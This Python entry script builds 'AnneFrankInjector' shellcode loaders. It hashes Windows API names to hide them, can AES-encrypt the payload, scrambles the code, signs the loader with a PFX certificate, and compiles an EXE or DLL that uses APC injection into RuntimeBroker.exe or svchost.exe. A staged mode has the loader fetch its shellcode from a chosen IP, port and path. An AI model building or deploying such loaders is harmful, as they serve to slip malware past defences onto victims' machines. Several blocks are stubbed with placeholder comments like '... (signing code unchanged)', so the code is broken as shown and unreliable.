# -*- coding: utf-8 -*-

import os
import sys
import random
import subprocess
import shutil, errno

from importlib import resources
from core.hashing import Hasher
from argparse import ArgumentParser
from core.utils import Colors, banner
from core.encryption import Encryption


def main():

    parser = ArgumentParser(description="AnneFrankInjector", epilog="Author: Excalibra")
    subparsers = parser.add_subparsers(dest="commands", help="Staged or Stageless Payloads", required=True)

    parser_staged = subparsers.add_parser("staged", help="Staged")
    parser_stageless = subparsers.add_parser("stageless", help="Stageless")

    # Staged arguments
    parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
    parser_staged.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
    parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address from where your shellcode is gonna be fetched.", required=True)
    parser_staged.add_argument("-po", "--port", type=int, help="Port from where the HTTP connection is gonna fetch your shellcode.", required=True)
    parser_staged.add_argument("-pa", "--path", type=str, help="Path from where your shellcode is gonna be fetched.", required=True)
    parser_staged.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: af")
    parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
    parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
    parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
    parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
    parser_staged.epilog = "Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'"

    # Stageless arguments
    parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
    parser_stageless.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
    parser_stageless.add_argument("-o", "--output", type=str, help="Output filename (without extension). Default: annefrank_loader")
    parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
    parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
    parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
    parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
    parser_stageless.epilog = "Example usage: python main.py stageless -p shellcode.bin -o myloader -e -s -pfx cert.pfx -pfx-pass 'password'"

    args = parser.parse_args()
    banner()

#--------------------------------------#
#----------- Staged Variant -----------#
#--------------------------------------#
    if args.commands == "staged":

        print(Colors.green("[i] Staged Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        cr_directory    = os.path.dirname(os.path.abspath(__file__))
        src_directory   = resources.files("templates").joinpath("staged")
        dst_directory   = f'{cr_directory}\\.afpacker'

        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload and args.ip_address and args.port and args.path:

            print(Colors.green("[i] Corresponding template selected.."))

            ip = args.ip_address
            port = args.port
            path = args.path

            with open(f'{dst_directory}\\download.c', 'r') as file:
                download_data = file.readlines()

            for i in range(len(download_data)):
                if "#-IP_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace("#-IP_VALUE-#", ip)
                if "#-PORT_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace("#-PORT_VALUE-#", str(port))
                if "#-PATH_VALUE-#" in download_data[i]:
                    download_data[i] = download_data[i].replace('#-PATH_VALUE-#', path)

            with open(f'{dst_directory}\\download.c', 'w') as file:
                file.writelines(download_data)

            with open(args.payload, "rb") as file:
                payload = file.read()

            INITIAL_SEED = random.randint(5, 20)
            INITIAL_HASH = random.randint(2000, 9000)

            NTDLL_HASH = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}\\{filename}", "r") as file:
                        data = file.readlines()

                    for i in range(len(data)):
                        if "#-INITIAL_HASH_VALUE-# " in data[i]:
                            data[i] = data[i].replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                        if "#-INITIAL_SEED_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                        if "#-NTDLL_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                        if "#-KERNEL32_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                        if "#-KERNELBASE_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                        if "#-DAPS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                        if "#-CREATEPROCESSA_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                        if "#-NTMVOS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)

                    with open(f"{dst_directory}\\{filename}", "w") as file:
                        file.writelines(data)

            print(Colors.green("[+] Template files modified !"))

            print(Colors.light_yellow("[+] Setting APC injection target process..."))
            if args.format is None or args.format == "EXE":
                with open(f'{dst_directory}/main.c', 'r') as file:
                    main_data = file.readlines()
                    for i in range(len(main_data)):
                        if "#-TARGET_PROCESS-#" in main_data[i]:
                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)

                with open(f'{dst_directory}/main.c', 'w') as file:
                    file.writelines(main_data)

            if args.format == "DLL":
                with open(f'{dst_directory}/main_dll.c', 'r') as file:
                    main_data = file.readlines()
                    for i in range(len(main_data)):
                        if "#-TARGET_PROCESS-#" in main_data[i]:
                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)

                with open(f'{dst_directory}/main_dll.c', 'w') as file:
                    file.writelines(main_data)

            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))

            # Determine output filename
            if args.output:
                output_name = args.output
            else:
                output_name = "af"

            if args.encrypt:

                print(Colors.green("[i] Encryption selected."))
                print(Colors.light_yellow("[+] Encrypting the payload..."))

                enc_payload, key, iv = Encryption.EncryptAES(payload)

                if os.path.exists(f"{output_name}.bin"):
                    os.remove(f"{output_name}.bin")

                with open(f"{output_name}.bin", "wb") as file:
                    file.write(enc_payload)

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}\\{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "#-KEY_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
                            if "#-IV_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)

                        with open(f"{dst_directory}\\{filename}", "w") as file:
                            file.writelines(main_data)

                print(Colors.green(f"[+] Payload encrypted and saved to {os.getcwd()}\\{output_name}.bin !"))

            if args.encrypt is False:

                print(Colors.green("[i] Encryption not selected."))
                print(Colors.light_yellow("[+] Compiling the loader..."))

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}\\{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "#include \"AES_128_CBC.h\"" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "AES_CTX" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "Starting the decryption..." in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
                                main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) pEncPayload, sEncPayload, &pProcess)) {{"

                        with open(f"{dst_directory}\\{filename}", "w") as file:
                            file.writelines(main_data)

                shutil.copy(args.payload, f"{output_name}.bin")

            if args.scramble:
                # ... (scrambling code unchanged)
                # We need to ensure the scrambling uses the output_name later? No, scrambling just modifies source.

            if args.format is None or args.format == "EXE":
                if args.pfx:
                    # ... (signing code unchanged)
                else:
                    os.system(f"cd {dst_directory} && make clean && make FORMAT=EXE")
                    shutil.move(f"{dst_directory}\\af.exe", f"{output_name}.exe")
                    shutil.rmtree(dst_directory)
                    print(Colors.green("[+] Loader compiled !"))

            if args.format == "DLL":
                # ... (DLL handling, rename to output_name.dll)
                os.system(f"cd {dst_directory} && make clean && make FORMAT=DLL")
                shutil.move(f"{dst_directory}\\af.dll", f"{output_name}.dll")
                shutil.rmtree(dst_directory)
                print(Colors.green("[+] Loader compiled !"))

            print(Colors.green("[+] DONE !"))

#-----------------------------------------#
#----------- Stageless Variant -----------#
#-----------------------------------------#
    if args.commands == "stageless":

        print(Colors.green("[i] Stageless Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        cr_directory    = os.path.dirname(os.path.abspath(__file__))
        src_directory   = resources.files("templates").joinpath("stageless")
        dst_directory   = f'{cr_directory}\\.afpacker'

        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload:

            with open(args.payload, "rb") as file:
                raw_payload = file.read()

            payload = ', '.join(f"0x{b:02x}" for b in raw_payload)

            INITIAL_SEED = random.randint(5, 20)
            INITIAL_HASH = random.randint(2000, 9000)

            NTDLL_HASH = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}\\{filename}", "r") as file:
                        data = file.readlines()

                    for i in range(len(data)):
                        if "#-INITIAL_HASH_VALUE-# " in data[i]:
                            data[i] = data[i].replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                        if "#-INITIAL_SEED_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                        if "#-NTDLL_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                        if "#-KERNEL32_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                        if "#-KERNELBASE_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                        if "#-DAPS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                        if "#-CREATEPROCESSA_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                        if "#-NTMVOS_VALUE-#" in data[i]:
                            data[i] = data[i].replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)

                    with open(f"{dst_directory}\\{filename}", "w") as file:
                        file.writelines(data)

            print(Colors.green("[+] Template files modified !"))

            print(Colors.light_yellow("[+] Setting APC injection target process..."))
            if args.format is None or args.format == "EXE":
                with open(f'{dst_directory}/main.c', 'r') as file:
                    main_data = file.readlines()
                    for i in range(len(main_data)):
                        if "#-TARGET_PROCESS-#" in main_data[i]:
                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)

                with open(f'{dst_directory}/main.c', 'w') as file:
                    file.writelines(main_data)

            if args.format == "DLL":
                with open(f'{dst_directory}/main_dll.c', 'r') as file:
                    main_data = file.readlines()
                    for i in range(len(main_data)):
                        if "#-TARGET_PROCESS-#" in main_data[i]:
                            main_data[i] = main_data[i].replace("#-TARGET_PROCESS-#", args.apc)

                with open(f'{dst_directory}/main_dll.c', 'w') as file:
                    file.writelines(main_data)

            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))

            # Determine output name
            if args.output:
                output_name = args.output
            else:
                output_name = "annefrank_loader"

            if args.encrypt:

                print(Colors.green("[i] Encryption selected."))
                print(Colors.light_yellow("[+] Encrypting the payload..."))

                enc_payload, key, iv = Encryption.EncryptAES(raw_payload)

                hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}\\{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "#-KEY_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
                            if "#-IV_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)
                            if "#-PAYLOAD_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", str(hex_payload))

                        with open(f"{dst_directory}\\{filename}", "w") as file:
                            file.writelines(main_data)

                print(Colors.green(f"[+] Payload encrypted and saved into payload[] variable in main.c !"))

            if args.encrypt is False:

                print(Colors.green("[i] Encryption not selected."))
                print(Colors.light_yellow("[+] Compiling the loader..."))

                for filename in os.listdir(dst_directory):
                    if filename.startswith("main") and filename.endswith(".c"):
                        with open(f"{dst_directory}\\{filename}", "r") as file:
                            main_data = file.readlines()

                        for i in range(len(main_data)):
                            if "#include \"AES_128_CBC.h\"" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "AES_CTX" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
                                main_data[i] = f"//{main_data[i]}"
                            if "Starting the decryption..." in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload)" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
                                main_data[i] = f"\t//{main_data[i]}"
                            if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
                                main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) &payload, sEncPayload, &pProcess)) {{"
                            if "#-PAYLOAD_VALUE-#" in main_data[i]:
                                main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", payload)

                        with open(f"{dst_directory}\\{filename}", "w") as file:
                            file.writelines(main_data)

            if args.scramble:
                # ... (scrambling code unchanged)
                pass

            if args.format is None or args.format == "EXE":
                if args.pfx:
                    # ... (signing code unchanged)
                else:
                    os.system(f"cd {dst_directory} && make clean && make FORMAT=EXE")
                    shutil.move(f"{dst_directory}\\afloader.exe", f"{output_name}.exe")
                    shutil.rmtree(dst_directory)
                    print(Colors.green("[+] Loader compiled !"))

            if args.format == "DLL":
                os.system(f"cd {dst_directory} && make clean && make FORMAT=DLL")
                shutil.move(f"{dst_directory}\\afloader.dll", f"{output_name}.dll")
                shutil.rmtree(dst_directory)
                print(Colors.green("[+] Loader compiled !"))

            print(Colors.green("[+] DONE !"))

if __name__ == "__main__":
    main()
